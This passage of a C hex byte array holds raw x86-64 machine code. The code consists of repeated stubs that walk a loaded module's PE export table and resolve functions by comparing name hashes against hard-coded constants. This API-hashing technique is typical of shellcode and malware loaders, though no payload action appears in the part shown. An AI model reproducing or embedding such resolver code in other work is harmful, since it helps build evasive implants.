	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0x5F, 0xAF, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0x45, 0xAF, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0x02, 0xAF,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0x6D, 0x1F, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0x52, 0x3E, 0x4B, 0x00, 0xB5, 0x95,
	0x94, 0x8A, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0xB8, 0xAE, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0x94,
	0xAE, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x4D, 0x5A, 0x00, 0x00, 0x48,
	0x89, 0x05, 0x86, 0xAE, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x7F, 0xAE, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0x6A, 0xAE, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x43, 0xAE, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0x29,
	0xAE, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0x0F, 0xAE, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0xF5, 0xAD, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0xB2, 0xAD,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0x1D, 0x1E, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0x65, 0x1C, 0xF5, 0x2B, 0x7E, 0xB5,
	0x0A, 0x8A, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0x68, 0xAD, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0x44,
	0xAD, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0xFD, 0x58, 0x00, 0x00, 0x48,
	0x89, 0x05, 0x36, 0xAD, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x2F, 0xAD, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0x1A, 0xAD, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0xF3, 0xAC, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0xD9,
	0xAC, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0xBF, 0xAC, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0xA5, 0xAC, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0x62, 0xAC,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0xCD, 0x1C, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0x3C, 0x71, 0x3B, 0x69, 0x0B, 0x96,
	0xE5, 0xF4, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0x18, 0xAC, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0xF4,
	0xAB, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0xAD, 0x57, 0x00, 0x00, 0x48,
	0x89, 0x05, 0xE6, 0xAB, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xDF, 0xAB, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0xCA, 0xAB, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0xA3, 0xAB, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0x89,
	0xAB, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0x6F, 0xAB, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0x55, 0xAB, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0x12, 0xAB,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0x7D, 0x1B, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0x4F, 0x55, 0xB3, 0xDE, 0x53, 0x25,
	0xF6, 0x1A, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0xC8, 0xAA, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0xA4,
	0xAA, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x5D, 0x56, 0x00, 0x00, 0x48,
	0x89, 0x05, 0x96, 0xAA, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x8F, 0xAA, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0x7A, 0xAA, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x53, 0xAA, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0x39,
	0xAA, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0x1F, 0xAA, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0x05, 0xAA, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0xC2, 0xA9,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0x2D, 0x1A, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0x9A, 0xD7, 0x0B, 0xF7, 0x67, 0x40,
	0xDC, 0x1C, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0x78, 0xA9, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0x54,
	0xA9, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x0D, 0x55, 0x00, 0x00, 0x48,
	0x89, 0x05, 0x46, 0xA9, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x3F, 0xA9, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0x2A, 0xA9, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x03, 0xA9, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0xE9,
	0xA8, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0xCF, 0xA8, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0xB5, 0xA8, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0x72, 0xA8,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0xDD, 0x18, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0xC9, 0xAC, 0x1B, 0x62, 0x21, 0x14,
	0xAC, 0x20, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0x28, 0xA8, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0x04,
	0xA8, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0xBD, 0x53, 0x00, 0x00, 0x48,
	0x89, 0x05, 0xF6, 0xA7, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xEF, 0xA7, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0xDA, 0xA7, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0xB3, 0xA7, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0x99,
	0xA7, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0x7F, 0xA7, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0x65, 0xA7, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0x22, 0xA7,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0x8D, 0x17, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0x0C, 0x2B, 0xC8, 0x07, 0x2B, 0xC9,
	0x50, 0x25, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0xD8, 0xA6, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0xB4,
	0xA6, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x6D, 0x52, 0x00, 0x00, 0x48,
	0x89, 0x05, 0xA6, 0xA6, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x9F, 0xA6, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0x8A, 0xA6, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x63, 0xA6, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0x49,
	0xA6, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0x2F, 0xA6, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0x15, 0xA6, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0xD2, 0xA5,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0x3D, 0x16, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0xFE, 0xF6, 0x0F, 0xA5, 0xDD, 0xB7,
	0xE3, 0x2B, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0x88, 0xA5, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0x64,
	0xA5, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x1D, 0x51, 0x00, 0x00, 0x48,
	0x89, 0x05, 0x56, 0xA5, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x4F, 0xA5, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0x3A, 0xA5, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x13, 0xA5, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0xF9,
	0xA4, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0xDF, 0xA4, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0xC5, 0xA4, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
